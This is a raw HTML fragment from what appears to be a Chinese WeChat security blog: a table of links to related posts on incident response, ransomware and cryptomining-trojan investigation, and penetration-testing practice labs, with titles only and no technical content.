class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247490072&amp;idx=1&amp;sn=5b905316b7251c03175197340ca0ff47&amp;scene=21#wechat_redirect" textvalue="应急响应|某项目特洛伊挖矿木马靶场复现(附开源环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|某项目特洛伊挖矿木马靶场复现(附开源环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-indent: 0px;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489973&amp;idx=1&amp;sn=3004b71de912f0e6d09b31822ac23a4a&amp;scene=21#wechat_redirect" textvalue="学习干货|从迷茫到前行：我的网络安全学习之路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">学习干货|从迷茫到前行：我的网络安全学习之路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489934&amp;idx=1&amp;sn=031d5ed1ed25601b36ab5e201c3ca54c&amp;scene=21#wechat_redirect" textvalue="应急响应|2025年勒索病毒排查溯源指南(附开源训练环境)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|2025年勒索病毒排查溯源指南(附开源训练环境)</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489784&amp;idx=1&amp;sn=d9081baca8aa3a0a649f5857fc2703f8&amp;scene=21#wechat_redirect" textvalue="应急响应真没这么难！速看某公交系统靶机应急响应排查思路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应真没这么难！速看某公交系统靶机应急响应排查思路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489716&amp;idx=1&amp;sn=5e444d94dd23e79a628b72b5d9fbb86e&amp;scene=21#wechat_redirect" textvalue="渗透测试|小白也能学会渗透测试！某医院HIS系统渗透测试靶场学习" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|小白也能学会渗透测试！某医院HIS系统渗透测试靶场学习</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489580&amp;idx=1&amp;sn=cffaf95fd15270a89cb320bea6e35a4f&amp;scene=21#wechat_redirect" textvalue="应急演练|深入浅出分析某海外能源巨头勒索模拟演练过程" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急演练|深入浅出分析某海外能源巨头勒索模拟演练过程</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489397&amp;idx=1&amp;sn=8107187ce38a0e38e1fd54e50d72af33&amp;scene=21#wechat_redirect" textvalue="应急响应|学校不教的我来教！某学校系统中挖矿病毒的超详细排查思路" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">应急响应|学校不教的我来教！某学校系统中挖矿病毒的超详细排查思路</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247489057&amp;idx=1&amp;sn=1346c8c7e633a4a26ceed0a238eac278&amp;scene=21#wechat_redirect" textvalue="开源万岁|我妈说我奶想学习了，让我给搭建一个知识库学学IT" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">开源万岁|我妈说我奶想学习了，让我给搭建一个知识库学学IT</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247488993&amp;idx=1&amp;sn=c000a3dac67c71e57d82593432eec341&amp;scene=21#wechat_redirect" textvalue="渗透测试|倒反天罡！转发给你的老师《0基础也能学渗透测试+代码审计电商平台靶场》让他重修" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|倒反天罡！转发给你的老师《0基础也能学渗透测试+代码审计电商平台靶场》让他重修</span></a></span></section></td></tr><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: center;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link mp_article_text_link" target="_blank" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);margin: 0px;padding: 0px;outline: 0px;color: rgb(87, 107, 149);text-decoration: none;-webkit-user-drag: none;cursor: default;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;" href="https://mp.weixin.qq.com/s?__biz=MzkzMDE5OTQyNQ==&amp;mid=2247488787&amp;idx=1&amp;sn=08b8712c4dcc1ec45538e3c383ebce42&amp;scene=21#wechat_redirect" textvalue="渗透测试|学校教不会的我来教，一篇文章学习渗透测试那些事(某金融程序靶场测试的项目式教学)" data-itemshowtype="0" linktype="text" data-linktype="2"><span textstyle="" style="font-weight: bold;">渗透测试|学校教不会的我来教，一篇文章学习渗透测试那些事(某金融程序靶场测试的项目式教学)</span></a></span></section></td></tr></tbody></table>  
  
  
